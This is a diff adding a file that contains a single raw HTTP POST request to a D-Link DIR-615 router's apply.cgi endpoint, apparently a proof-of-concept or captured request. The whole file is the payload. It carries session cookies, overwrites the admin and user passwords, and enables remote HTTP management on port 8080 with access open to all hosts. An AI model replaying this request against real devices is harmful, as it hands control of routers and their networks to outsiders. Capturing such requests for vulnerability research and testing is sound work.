@@ -1,0 +1,15 @@
+POST /apply.cgi HTTP/1.1
+Host: 0.0.0.0:49155
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1176
+Origin: http://0.0.0.0:49155
+Connection: keep-alive
+Referer: http://0.0.0.0:49155/tools_admin.asp
+Cookie: uid=xkbzmm1Deq; session_uid=vkcfwkbdyh; auth_key=OH+ABPVFwzO2x/tDln+qxwRjY2MYY2MEY2MEY2MHY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjYw==
+Upgrade-Insecure-Requests: 1
+
+html_response_page=back.asp&html_response_message=The+setting+is+saved.&html_response_return_page=tools_admin.asp&reboot_type=filter&blank_status=0&blank_state=0&inbound_filter_name_00=&inbound_filter_name_01=&inbound_filter_name_02=&inbound_filter_name_03=&inbound_filter_name_04=&inbound_filter_name_05=&inbound_filter_name_06=&inbound_filter_name_07=&inbound_filter_name_08=&inbound_filter_name_09=&inbound_filter_name_10=&inbound_filter_name_11=&inbound_filter_name_12=&inbound_filter_name_13=&inbound_filter_name_14=&inbound_filter_name_15=&inbound_filter_name_16=&inbound_filter_name_17=&inbound_filter_name_18=&inbound_filter_name_19=&inbound_filter_name_20=&inbound_filter_name_21=&inbound_filter_name_22=&inbound_filter_name_23=&button=Save+Settings&admin_password=WDB8WvbXdHtZyM8Ms2RENgHlacJghQyG&admin_password2=WDB8WvbXdH&admin_password1=&admPass2=&user_password=WDB8WvbXdHtZyM8Ms2RENgHlacJghQyG&user_password2=WDB8WvbXdH&user_password1=&usrPass2=&hostname=DIR-615&graphical_enable=1&graph_auth_enable=1&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All
